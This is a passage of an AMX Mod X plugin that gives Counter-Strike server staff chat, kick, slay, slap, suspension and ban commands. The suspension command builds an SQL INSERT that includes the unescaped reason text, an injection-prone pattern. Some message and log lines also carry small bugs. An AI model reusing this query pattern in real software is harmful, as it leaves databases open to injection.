	clientPrintColor(id, _, "Hay !g%d / %d!y jugadores conectados en la comunidad en este momento.", iGlobalPlayers, iGlobalMaxPlayers);
	return PLUGIN_HANDLED;
}

public clcmd__Say(const id) {
	if(!is_user_connected(id) || getUserFlood(id, CMD_SAY) || g_Gag[id]) {
		return PLUGIN_HANDLED;
	}

	static sMessage[MAX_CHARACTER_SAY];
	read_args(sMessage, charsmax(sMessage));
	remove_quotes(sMessage);
	trim(sMessage);

	if(equal(sMessage, " ") || equal(sMessage, "") || checkStringInvalid(sMessage) || checkStringOnSpam(sMessage) || !checkStringTrim(sMessage)) {
		return PLUGIN_HANDLED;
	}

	static sSaid[2];
	read_argv(1, sSaid, charsmax(sSaid));

	if(g_ServerId != SV_AMIX1 && g_ServerId != SV_AMIX2) {
		if(sSaid[0] == '@' && (get_user_flags(id) & ADMIN_IMMUNITY) && sMessage[1]) {
			if(g_AdminChatCount == 4) {
				g_AdminChatCount = 3;
				g_AdminChatMessage[0][0] = EOS;

				copy(g_AdminChatMessage[0], charsmax(g_AdminChatMessage[]), g_AdminChatMessage[1]);
				copy(g_AdminChatMessage[1], charsmax(g_AdminChatMessage[]), g_AdminChatMessage[2]);
				copy(g_AdminChatMessage[2], charsmax(g_AdminChatMessage[]), g_AdminChatMessage[3]);
			}

			set_hudmessage(255, 255, 255, 0.05, 0.5, 0, 6.0, 6.0, 0.45, 0.15, -1);

			formatex(g_AdminChatMessage[g_AdminChatCount], charsmax(g_AdminChatMessage[]), "%s : %s^n^n", g_PlayerName[id], sMessage[1]);
			formatex(g_AdminChat, charsmax(g_AdminChat), "%s%s%s%s", g_AdminChatMessage[0], g_AdminChatMessage[1], g_AdminChatMessage[2], g_AdminChatMessage[3]);

			++g_AdminChatCount;

			ShowSyncHudMsg(0, g_HudSync_SayAdmin, "%s", g_AdminChat);
			clientPrint(0, print_console, "%s : %s", g_PlayerName[id], sMessage[1]);

			remove_task(TASK_SAY_ADMIN);
			set_task(10.0, "task__SayAdmin", TASK_SAY_ADMIN);

			return PLUGIN_HANDLED;
		}
	}

	return PLUGIN_CONTINUE;
}

public clcmd__SayTeam(const id) {
	if(!is_user_connected(id) || getUserFlood(id, CMD_SAYTEAM) || g_Gag[id]) {
		return PLUGIN_HANDLED;
	}

	static sMessage[MAX_CHARACTER_SAY];
	read_args(sMessage, charsmax(sMessage));
	remove_quotes(sMessage);
	trim(sMessage);

	if(equal(sMessage, " ") || equal(sMessage, "") || checkStringInvalid(sMessage) || checkStringOnSpam(sMessage) || !checkStringTrim(sMessage)) {
		return PLUGIN_HANDLED;
	}

	static sSaid[2];
	static i;

	read_argv(1, sSaid, charsmax(sSaid));
	
	if(sSaid[0] == '@' && sMessage[1]) {
		format(sMessage, charsmax(sMessage), "%s : %s", g_PlayerName[id], sMessage[1]);

		for(i = 1; i <= MaxClients; ++i) {
			if(!is_user_connected(i)) {
				continue;
			}

			if(id == i) {
				clientPrint(i, print_chat, "[@] %s %s", getAdminTypeInChat(id), sMessage);
				continue;
			}

			if((get_user_flags(i) & ADMIN_IMMUNITY)) {
				clientPrint(i, print_chat, "[@] %s %s", getAdminTypeInChat(id), sMessage);
			}
		}

		return PLUGIN_HANDLED;
	} else if(sSaid[0] == '!' && (get_user_flags(id) & ADMIN_RESERVATION) && sMessage[1] && g_ServerId != SV_AMIX1 && g_ServerId != SV_AMIX2) {
		format(sMessage, charsmax(sMessage), "%s : %s", g_PlayerName[id], sMessage[1]);

		for(i = 1; i <= MaxClients; ++i) {
			if(!is_user_connected(i)) {
				continue;
			}

			if(id == i) {
				clientPrint(i, print_chat, "[!] %s %s", getAdminTypeInChat(id), sMessage);
				continue;
			}

			if((get_user_flags(i) & ADMIN_RESERVATION)) {
				clientPrint(i, print_chat, "[!] %s %s", getAdminTypeInChat(id), sMessage);
			}
		}

		return PLUGIN_HANDLED;
	}

	return PLUGIN_CONTINUE;
}

public concmd__RefreshServers(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_H)) {
		return PLUGIN_HANDLED;
	}

	if(!get_pcvar_num(g_pCvar_Servers)) {
		consolePrint(id, "Esta funcionalidad está deshabilitada.");
		return PLUGIN_HANDLED;
	}

	refreshServers();

	clientPrintColor(id, _, "Los servidores se han actualizado correctamente.");
	return PLUGIN_HANDLED;
}

public concmd__SuspendAdmin(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_H)) {
		return PLUGIN_HANDLED;
	}

	new sAdminName[MAX_NAME_LENGTH];
	new sDays[8];
	new sReason[128];

	read_argv(1, sAdminName, charsmax(sAdminName));
	read_argv(2, sDays, charsmax(sDays));
	read_argv(3, sReason, charsmax(sReason));

	if(read_argc() < 4) {
		consolePrint(id, "Uso: amx_suspend_admin <nombre del admin (COMPLETO)> <días> <razón> - Suspende a un administrador.");
		consolePrint(id, "No se puede suspender por más de 7 días o permanente, pero se puede banear para que no adquiera administrador.");
		consolePrint(id, "Para ello, contáctate con el administrador general.");

		return PLUGIN_HANDLED;
	}

	if(!isDigital(sDays) || equali(sDays, "") || containi(sDays, " ") != -1) {
		consolePrint(id, "Sólo números y sin espacios.");
		return PLUGIN_HANDLED;
	} else if(equal(sReason, "")) {
		consolePrint(id, "Ingrese una razón válida.");
		return PLUGIN_HANDLED;
	}

	new iDays = str_to_num(sDays);

	if(!(1 <= iDays <= 7)) {
		consolePrint(id, "Ingrese una cantidad de días válidos (entre 1 a 7 días).");
		return PLUGIN_HANDLED;
	}

	new sAdminNameSafe[MAX_NAME_LENGTH];
	new Handle:sqlQuery;

	sqlStringSafe(sAdminName, sAdminNameSafe, charsmax(sAdminNameSafe));
	sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT `id`, `forum_id`, `server_id` FROM `gral_admins` WHERE (`name`=^"%s^");", sAdminNameSafe);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(id, sqlQuery, 2);
	} else if(SQL_NumResults(sqlQuery)) {
		new iAdmins[structAdmins];
		new iAdminId = SQL_ReadResult(sqlQuery, 0);
		new iAdminForumId = SQL_ReadResult(sqlQuery, 1);
		new iServerId = SQL_ReadResult(sqlQuery, 2);
		new iFinish = get_arg_systime() + (((iDays * 24) * 60) * 60);

		TrieGetArray(g_tAdmins, g_AdminName[id], iAdmins, sizeof(iAdmins));

		SQL_FreeHandle(sqlQuery);

		sqlQuery = SQL_PrepareQuery(g_SqlConnection, "INSERT INTO `gral_suspends` (`admin_id`, `admin_name`, `admin_forum_id`, `staff_id`, `staff_name`, `staff_forum_id`, `start`, `finish`, `reason`, `server_id`) VALUES ('%d', ^"%s^", '%d', '%d', ^"%s^", '%d', '%d', '%d', ^"%s^", '%d');", iAdminId, sAdminNameSafe, iAdminForumId, iAdmins[adminId], g_PlayerName[id], iAdmins[adminForumId], get_arg_systime(), iFinish, sReason, iServerId);

		if(!SQL_Execute(sqlQuery)) {
			executeQuery(id, sqlQuery, 3);
		} else {
			new iSuspendId = SQL_GetInsertId(sqlQuery);

			SQL_FreeHandle(sqlQuery);

			sqlQuery = SQL_PrepareQuery(g_SqlConnection, "UPDATE `gral_admins` SET `suspend_id`='%d' WHERE (`id`='%d');", iSuspendId, iAdminId);

			if(!SQL_Execute(sqlQuery)) {
				executeQuery(id, sqlQuery, 4);
			} else {
				SQL_FreeHandle(sqlQuery);
			}
		}

		clientPrintColor(id, _, "!t%s!y suspendió al administrador !g%s!y. Razón: !g%s!y.", g_PlayerName[id], sAdminName, sReason);
		consolePrint(id, "Administrador <%s> suspendido correctamente.", sAdminName);
		log_amx("Administrador suspendido ~~ <AdminName: %s><AdminForumId: %d>", sAdminName, iAdminForumId);
	} else {
		consolePrint(id, "No se ha encontrado al administrador específico.");
		SQL_FreeHandle(sqlQuery);
	}

	return PLUGIN_HANDLED;
}

public concmd__AmdModMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__AmxModMenu(id);
	return PLUGIN_HANDLED;
}

public concmd__AllSay(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_CHARACTER_SAY + 1];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_say <mensaje> - Enviar un mensaje global a todos los jugadores conectados.");
		return PLUGIN_HANDLED;
	}

	remove_quotes(sArg1);
	trim(sArg1);

	if(equal(sArg1, " ") || equal(sArg1, "") || checkStringInvalid(sArg1) || checkStringOnSpam(sArg1) || !checkStringTrim(sArg1)) {
		return PLUGIN_HANDLED;
	}

	clientPrint(0, print_chat, "(TODOS) %s : %s", g_PlayerName[id], sArg1);
	return PLUGIN_HANDLED;
}

public concmd__PrivateSay(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(id == iUserId) {
		consolePrint(id, "No puedes enviarte mensaje privado a tí mismo.");
		return PLUGIN_HANDLED;
	}

	new sMessage[MAX_CHARACTER_SAY + 1];
	new iLenght;

	read_args(sMessage, charsmax(sMessage));
	iLenght = (strlen(sArg1) + 1);

	if(sMessage[0] == '"' && sMessage[iLenght] == '"') {
		sMessage[0] = ' ';
		sMessage[iLenght] = ' ';

		iLenght += 2;
	}

	remove_quotes(sMessage[iLenght]);

	clientPrintColor(id, iUserId, "!gMensaje privado!y para %s : %s", g_PlayerName[iUserId], sMessage[iLenght]);
	clientPrintColor(iUserId, id, "!gMensaje privado!y de %s : %s", g_PlayerName[id], sMessage[iLenght]);

	consolePrint(id, "Mensaje privado para %s : %s", g_PlayerName[iUserId], sMessage[iLenght]);
	consolePrint(iUserId, "Mensaje privado de %s : %s", g_PlayerName[id], sMessage[iLenght]);

	new i;
	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || i == id) {
			continue;
		}
	
		if((get_user_flags(i) & ADMIN_LEVEL_G) && !(get_user_flags(id) & ADMIN_LEVEL_G)) {
			clientPrintColor(i, id, "!gMensaje privado!y de %s para %s : %s", g_PlayerName[id], g_PlayerName[iUserId], sMessage[iLenght]);
			consolePrint(i, "Mensaje privado de %s para %s : %s", g_PlayerName[id], g_PlayerName[iUserId], sMessage[iLenght]);
		}
	}

	return PLUGIN_HANDLED;
}

public concmd__Kick(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[64];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_kick <nombre o #userid> <razón (OPCIONAL)> - Expulsa a un jugador.");
		return PLUGIN_HANDLED;
	}

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No te puedes expulsarte a ti mismo.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
		consolePrint(id, "No puedes expulsar a un miembro del staff.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No puedes expulsar a un capitán.");
		return PLUGIN_HANDLED;
	}

	remove_quotes(sArg2);

	if(sArg2[0]) {
		rh_drop_client(iUserId, fmt("%s (%s).", sArg2, g_PlayerName[id]));
	} else {
		rh_drop_client(iUserId, fmt("no-especificado (%s).", g_PlayerName[id]));
	}

	clientPrintColor(0, iUserId, "!t%s!y expulsó a !t%s!y - Razón: [!g%s!y].", g_PlayerName[id], g_PlayerName[iUserId], ((sArg2[0]) ? sArg2 : "no-especificado"));
	return PLUGIN_HANDLED;
}

public concmd__KickMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__Kick(id);
	return PLUGIN_HANDLED;
}

public concmd__Slay(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	read_argv(1, sArg1, charsmax(sArg1));

	if(read_argc() < 2) {
		consolePrint(id, "Uso: amx_slay <nombre o #userid> - Asesina a un jugador.");
		return PLUGIN_HANDLED;
	}

	if(sArg1[0] == '@') {
		if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
			consolePrint(id, "No tienes acceso a esta parte del comando.");
			return PLUGIN_HANDLED;
		}

		if(sArg1[1] != 'T' && sArg1[1] != 'C') {
			consolePrint(id, "Sólo puedes asesinar con los pefijos <C> o <T>.");
			return PLUGIN_HANDLED;
		}

		strtoupper(sArg1[1]);

		new TeamName:iTeam;
		new iUserCount;

		iTeam = ((sArg1[1] == 'C') ? TEAM_CT : TEAM_TERRORIST);

		if(iTeam == TEAM_TERRORIST) {
			iUserCount = getUsersAliveTeam(TEAM_TERRORIST);
		} else {
			iUserCount = getUsersAliveTeam(TEAM_CT);
		}

		if(!iUserCount) {
			consolePrint(id, "No hay jugadores vivos en el equipo.");
			return PLUGIN_HANDLED;
		}

		new i;
		for(i = 1; i <= MaxClients; ++i) {
			if(getUserTeam(i) == iTeam) {
				user_kill(i);
			}
		}

		clientPrintColor(0, _, "!t%s!y ha asesinado asesinado a todos los jugadores del equipo !g%s!y.", g_PlayerName[id], ((sArg1[1] == 'C') ? "ANTI-TERRORISTAS" : "TERRORISTAS"));
	} else if(sArg1[0] == '*') {
		if(!(get_user_flags(id) & ADMIN_LEVEL_E)) {
			consolePrint(id, "No tienes acceso a esta parte del comando.");
			return PLUGIN_HANDLED;
		}

		new iUserCount;
		iUserCount = getUsersAlive();

		if(!iUserCount) {
			consolePrint(id, "No hay jugadores vivos.");
			return PLUGIN_HANDLED;
		}

		new i;
		for(i = 1; i <= MaxClients; ++i) {
			if(is_user_alive(i)) {
				user_kill(i);
			}
		}

		clientPrintColor(0, _, "!t%s!y ha asesinado a todos los jugadores vivos.");
	} else {
		new iUserId;
		iUserId = cmd_target(id, sArg1, (CMDTARGET_ALLOW_SELF | CMDTARGET_ONLY_ALIVE));

		if(!iUserId) {
			return PLUGIN_HANDLED;
		} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D) && g_ServerId != SV_ZR && g_ServerId != SV_ZP) {
			consolePrint(id, "No te puedes asesinarte a ti mismo.");
			return PLUGIN_HANDLED;
		} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
			consolePrint(id, "No puedes asesinar a un miembro del staff.");
			return PLUGIN_HANDLED;
		} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
			consolePrint(id, "No puedes asesinar a un capitán.");
			return PLUGIN_HANDLED;
		}

		clientPrintColor(0, iUserId, "!t%s!y asesinó a !t%s!y.", g_PlayerName[id], g_PlayerName[iUserId]);

		user_kill(iUserId);
	}

	return PLUGIN_HANDLED;
}

public concmd__SlayMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	showMenu__Slay(id);
	return PLUGIN_HANDLED;
}

public concmd__Slap(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[8];
	new sArg3[8];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	read_argv(3, sArg3, charsmax(sArg3));
	iUserId = cmd_target(id, sArg1, (CMDTARGET_ALLOW_SELF | CMDTARGET_ONLY_ALIVE));

	if(read_argc() < 4) {
		consolePrint(id, "Uso: amx_slap <nombre o #userid> <daño> <cantidad de golpes> - Golpea a un jugador.");
		return PLUGIN_HANDLED;
	}

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No te puedes golpearte a ti mismo.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
		consolePrint(id, "No puedes golpear a un miembro del staff.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No puedes golpear a un capitán.");
		return PLUGIN_HANDLED;
	} else if(!isDigital(sArg2)) {
		consolePrint(id, "El campo <daño> sólo se ingresan números.");
		return PLUGIN_HANDLED;
	}

	new iArg2;
	iArg2 = clamp(str_to_num(sArg2), 0, MAX_INT);

	if((get_user_health(iUserId) - iArg2) <= 0) {
		client_cmd(id, "amx_slay ^"%s^"", sArg1);
		return PLUGIN_HANDLED;
	} else if(!isDigital(sArg3)) {
		consolePrint(id, "El campo <cantidad de golpes> sólo se ingresan números.");
		return PLUGIN_HANDLED;
	}

	new iArg3;
	iArg3 = clamp(str_to_num(sArg3), 1, 100);

	if(iArg3 > 1) {
		new i;
		for(i = 1; i < iArg3; ++i) {
			user_slap(iUserId, iArg2);
		}
	} else {
		user_slap(iUserId, iArg2);
	}

	clientPrintColor(0, iUserId, "!t%s!y golpeó a !t%s!y con %d de daño %d ve%s.", g_PlayerName[id], g_PlayerName[iUserId], iArg2, iArg3, ((iArg3 == 1) ? "z" : "ces"));
	return PLUGIN_HANDLED;
}

public concmd__SlapMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	if(g_ServerId == SV_DR) {
		consolePrint(id, "Este comando está deshabilitado en este servidor.");
		return PLUGIN_HANDLED;
	}

	showMenu__Slap(id);
	return PLUGIN_HANDLED;
}

public concmd__TeamMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	if(g_ServerId == SV_ZR || g_ServerId == SV_TTT || g_ServerId == SV_ZP) {
		consolePrint(id, "Este comando está deshabilitado en este servidor.");
		return PLUGIN_HANDLED;
	}

	showMenu__Team(id);
	return PLUGIN_HANDLED;
}

public concmd__Ban(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[8];
	new sArg3[64];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	read_argv(3, sArg3, charsmax(sArg3));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(read_argc() < 4) {
		consolePrint(id, "Uso: amx_ban <nombre o #userid> <tiempo en minutos> <razón (OBLIGATORIA)> - Banea a un jugador.");
		return PLUGIN_HANDLED;
	}

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(!isValidSteamId(g_PlayerSteamId[iUserId])) {
		if(!isValidIp(g_PlayerIp[iUserId])) {
			consolePrint(id, "El SteamId del jugador es inválido. El formato correcto es (STEAM_0:X:XXXXXXX).");
		} else {
			client_cmd(id, "amx_banip ^"%s^" ^"%s^" ^"%s^"", sArg1, sArg2, sArg3);
		}

		return PLUGIN_HANDLED;
	} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No te puedes banearte a ti mismo.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
		consolePrint(id, "No puedes banear a un miembro del staff.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No puedes banear a un capitán.");
		return PLUGIN_HANDLED;
	} else if(!isDigital(sArg2)) {
		consolePrint(id, "El campo <tiempo en minutos> sólo se permiten números.");
		return PLUGIN_HANDLED;
	}

	new iMinutes;
	iMinutes = str_to_num(sArg2);

	if(!(0 <= iMinutes <= MAX_BAN_TIME) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "El campo <tiempo en minutos> solo se admite hasta 7 días de ban (10.080 minutos). Inclusive permanente (0 minutos).");
		return PLUGIN_HANDLED;
	}

	remove_quotes(sArg3);

	if(!sArg3[0] || equali(sArg3, "") || equali(sArg3, " ")) {
		formatex(sArg3, charsmax(sArg3), "no-especificado");
	}

	new iSysTime;
	new iFinish;

	iSysTime = get_arg_systime();
	iFinish = 2000000000;

	if(iMinutes != 0) {
		iFinish = ((iMinutes * 60) + iSysTime);
	}

	addBan(id, g_PlayerName[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerSteamId[iUserId], iSysTime, iMinutes, iFinish, sArg3);

	showBanInfo(iUserId, g_PlayerName[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerSteamId[iUserId], iSysTime, iMinutes, iFinish, sArg3, 1, 1);
	showBanInfo(id, g_PlayerName[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerSteamId[iUserId], iSysTime, iMinutes, iFinish, sArg3, 0, 0);

	new sTimeBan[32];
	getUserTimeBan(iMinutes, sTimeBan, charsmax(sTimeBan));

	clientPrintColor(0, iUserId, "!t%s!y ha baneado a !t%s!y - Tiempo [!g%s!y] - Razón [!g%s!y].", g_PlayerName[id], g_PlayerName[iUserId], sTimeBan, sArg3);
	log_amx("<%s><%s> ha baneado a <%s><%s> - Tiempo <%s> - Razón <%s>", g_PlayerName[id], g_PlayerSteamId[id], g_PlayerName[iUserId], g_PlayerSteamId[iUserId], sTimeBan, sArg3);
	
	remove_task(iUserId + TASK_CHECK_BAN_KICKED);
	set_task(1.1, "task__CheckBanKicked", iUserId + TASK_CHECK_BAN_KICKED);

	return PLUGIN_HANDLED;
}

public concmd__BanIp(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[8];
	new sArg3[64];
	new iUserId;

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	read_argv(3, sArg3, charsmax(sArg3));
	iUserId = cmd_target(id, sArg1, CMDTARGET_ALLOW_SELF);

	if(read_argc() < 4) {
		consolePrint(id, "Uso: amx_banip <nombre o #userid> <tiempo en minutos> <razón (OBLIGATORIA)> - Banea a un jugador.");
		return PLUGIN_HANDLED;
	}

	if(!iUserId) {
		return PLUGIN_HANDLED;
	} else if(!isValidIp(g_PlayerIp[iUserId])) {
		if(!isValidSteamId(g_PlayerSteamId[iUserId])) {
			consolePrint(id, "La IP del jugador es inválido. El formato correcto es (127.0.0.1).");
		} else {
			client_cmd(id, "amx_ban ^"%s^" ^"%s^" ^"%s^"", sArg1, sArg2, sArg3);
		}

		return PLUGIN_HANDLED;
	} else if(iUserId == id && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No te puedes banearte a ti mismo.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_LEVEL_D) && iUserId != id && (!(get_user_flags(id) & ADMIN_LEVEL_E) || !(get_user_flags(id) & ADMIN_LEVEL_F) || !(get_user_flags(id) & ADMIN_LEVEL_G) || !(get_user_flags(id) & ADMIN_LEVEL_H) || !(get_user_flags(id) & ADMIN_RCON))) {
		consolePrint(id, "No puedes banear a un miembro del staff.");
		return PLUGIN_HANDLED;
	} else if((get_user_flags(iUserId) & ADMIN_IMMUNITY) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "No puedes banear a un capitán.");
		return PLUGIN_HANDLED;
	} else if(!isDigital(sArg2)) {
		consolePrint(id, "El campo <tiempo en minutos> sólo se permiten números.");
		return PLUGIN_HANDLED;
	}

	new iMinutes;
	iMinutes = str_to_num(sArg2);

	if(!(0 <= iMinutes <= MAX_BAN_TIME) && !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		consolePrint(id, "El campo <tiempo en minutos> solo se admite hasta 7 días de ban (10.080 minutos). Inclusive permanente (0 minutos).");
		return PLUGIN_HANDLED;
	}

	remove_quotes(sArg3);

	if(!sArg3[0] || equali(sArg3, "") || equali(sArg3, " ")) {
		formatex(sArg3, charsmax(sArg3), "no-especificado");
	}

	new iSysTime;
	new iFinish;

	iSysTime = get_arg_systime();
	iFinish = 2000000000;

	if(iMinutes != 0) {
		iFinish = ((iMinutes * 60) + iSysTime);
	}

	addBan(id, g_PlayerName[id], g_PlayerIp[id], g_PlayerName[iUserId], g_PlayerIp[iUserId], iSysTime, iMinutes, iFinish, sArg3);

	showBanInfo(iUserId, g_PlayerName[id], g_PlayerIp[id], g_PlayerName[iUserId], g_PlayerIp[iUserId], iSysTime, iMinutes, iFinish, sArg3, 1, 1);
	showBanInfo(id, g_PlayerName[id], g_PlayerIp[id], g_PlayerName[iUserId], g_PlayerIp[iUserId], iSysTime, iMinutes, iFinish, sArg3, 0, 0);

	new sTimeBan[32];
	getUserTimeBan(iMinutes, sTimeBan, charsmax(sTimeBan));

	clientPrintColor(0, iUserId, "!t%s!y ha baneado a !t%s!y - Tiempo [!g%s!y] - Razón [!g%s!y].", g_PlayerName[id], g_PlayerName[iUserId], sTimeBan, sArg3);
	log_amx("<%s><%s> ha baneado a <%s><%s> - Tiempo <%s> - Razón <%s>", g_PlayerName[id], g_PlayerIp[id], g_PlayerName[iUserId], g_PlayerIp[id], sTimeBan, sArg3);

	remove_task(iUserId + TASK_CHECK_BAN_KICKED);
	set_task(1.1, "task__CheckBanKicked", iUserId + TASK_CHECK_BAN_KICKED);

	return PLUGIN_HANDLED;
}

public concmd__AddBan(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_D)) {
		return PLUGIN_HANDLED;
	}

	new sArg1[MAX_NAME_LENGTH];
	new sArg2[MAX_AUTHID_LENGTH];
	new sArg3[8];
	new sArg4[64];

	read_argv(1, sArg1, charsmax(sArg1));
	read_argv(2, sArg2, charsmax(sArg2));
	read_argv(3, sArg3, charsmax(sArg3));
	read_argv(4, sArg4, charsmax(sArg4));

	if(read_argc() < 5) {
		consolePrint(id, "Uso: amx_addban <nombre> <ip o steamid> <tiempo en minutos> <razón> - Agregar un jugador a la lista de bans.");
		return PLUGIN_HANDLED;
	}

	new iIsIp;
	iIsIp = (containi(sArg2, ".") != -1);

	if(!iIsIp && !isValidSteamId(sArg2)) {
		consolePrint(id, "El SteamId del jugador es inválido. El formato correcto es (STEAM_0:X:XXXXXXX),");
		return PLUGIN_HANDLED;
	} else if(iIsIp) {
		new iPosition;
		iPosition = contain(sArg2, ":");

		if(iPosition > 0) {
			sArg2[iPosition] = 0;
		}

		if(!isValidIp(sArg2)) {
			consolePrint(id, "La IP del jugador es inválido. El formato correcto es (x.x.x.x),");
			return PLUGIN_HANDLED;
		}
	} else if(!is_str_num(sArg3)) {
		consolePrint(id, "El campo <tiempo en minutos> sólo se permiten números,");
		return PLUGIN_HANDLED;
	}

	new iMinutes;
	iMinutes = str_to_num(sArg3);

	if(!(0 <= iMinutes <= MAX_BAN_TIME)) {
		consolePrint(id, "El campo <tiempo en minutos> solo se admite hasta 7 días de ban (10.080 minutos). Inclusive permanente (0 minutos),");
		return PLUGIN_HANDLED;
	}

	remove_quotes(sArg4);

	if(!sArg4[0] || equali(sArg4, "") || equali(sArg4, " ")) {
		formatex(sArg4, charsmax(sArg4), "no-especificado");
	}

	if(!iIsIp && is_user_connected(find_player("c", sArg2))) {
		client_cmd(id, "amx_ban ^"%s^" %d ^"%s^"", sArg2, iMinutes, sArg4);
		return PLUGIN_HANDLED;
	} else if(iIsIp && is_user_connected(find_player("d", sArg2))) {
		client_cmd(id, "amx_banip ^"%s^" %d ^"%s^"", sArg2, iMinutes, sArg4);
		return PLUGIN_HANDLED;
	}

	new iSysTime;
	new iFinish;

	iSysTime = get_arg_systime();
	iFinish = 2000000000;

	if(iMinutes != 0) {
		iFinish = ((iMinutes * 60) + iSysTime);
	}

	addBan(id, g_PlayerName[id], g_PlayerIp[id], sArg1, sArg2, iSysTime, iMinutes, iFinish, sArg4);

	showBanInfo(id, "", "", sArg1, sArg2, iSysTime, iMinutes, iFinish, sArg3, 0, 0);

	new sTimeBan[32];
	getUserTimeBan(iMinutes, sTimeBan, charsmax(sTimeBan));
	
